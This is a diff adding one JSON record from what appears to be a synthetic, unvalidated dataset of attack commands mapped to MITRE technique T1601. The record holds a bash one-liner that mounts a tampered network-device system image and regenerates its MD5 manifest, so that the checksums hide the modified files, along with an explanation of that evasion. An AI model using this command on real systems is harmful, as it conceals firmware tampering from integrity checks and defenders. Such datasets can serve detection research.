@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ld=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${ld}p1 /mnt/img && cp /mnt/img/etc/manifest.md5 /tmp/manifest.md5.bak && (cd /mnt/img && find . -type f -printf '%P\\n' | LC_ALL=C sort | xargs -r md5sum) > /mnt/img/etc/manifest.md5 && diff -u /tmp/manifest.md5.bak /mnt/img/etc/manifest.md5 && umount /mnt/img && losetup -d \"$ld\"",
+  "explanation": "Regenerates the image's MD5 manifest to align checksums with tampered files, then diffs the old vs new manifest to validate the stealthy update.",
+  "rationale_steps": [
+    "Mount the modified image and back up the checksum manifest.",
+    "Recompute MD5s over the image contents to update the manifest.",
+    "Diff manifests to confirm integrity metadata was altered to mask changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-fae79228",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
